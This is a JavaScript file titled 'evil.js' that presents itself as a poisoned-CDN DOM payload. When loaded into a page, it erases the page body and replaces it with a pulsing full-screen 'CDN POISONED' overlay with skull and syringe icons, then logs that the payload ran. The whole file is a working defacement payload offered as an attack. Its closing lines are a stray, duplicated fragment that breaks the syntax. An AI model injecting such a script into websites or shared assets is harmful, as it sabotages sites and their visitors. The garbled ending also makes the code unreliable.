// evil.js — CDN POISONED DOM PAYLOAD (Skulls + Syringes Style)

(() => {
  const style = document.createElement('style');
  style.innerHTML = `
    @keyframes pulse {
      0% { transform: scale(1); opacity: 0.9; }
      50% { transform: scale(1.1); opacity: 1; }
      100% { transform: scale(1); opacity: 0.9; }
    }

    body {
      background-color: black;
      color: red;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.92);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 99999;
    }

    .title {
      font-size: 64px;
      font-weight: bold;
      color: red;
      text-shadow: 2px 2px 8px black;
      animation: pulse 2s infinite;
    }

    .subtitle {
      font-size: 24px;
      margin-top: 10px;
    }

    .icons {
      display: flex;
      gap: 30px;
      margin-top: 30px;
      animation: pulse 3s infinite;
    }

    .icons img {
      width: 80px;
      height: 80px;
    }
  `;
  document.head.appendChild(style);

  const overlay = document.createElement("div");
  overlay.className = "overlay";
  overlay.innerHTML = `
    <div class="title">💀 CDN POISONED 💀</div>
    <div class="subtitle">This resource has been compromised</div>
    <div class="icons">
      <img src="https://cdn-icons-png.flaticon.com/512/2765/2765273.png" alt="Skull">
      <img src="https://cdn-icons-png.flaticon.com/512/4492/4492312.png" alt="Syringe">
      <img src="https://cdn-icons-png.flaticon.com/512/2765/2765273.png" alt="Skull">
    </div>
  `;
  document.body.innerHTML = "";
  document.body.appendChild(overlay);

  console.log("☠️ CDN POISON PAYLOAD EXECUTED ☠️");
})();


  console.log("💉 HELLSTORM GORE PAYLOAD INJECTED SUCCESSFULLY");
})();


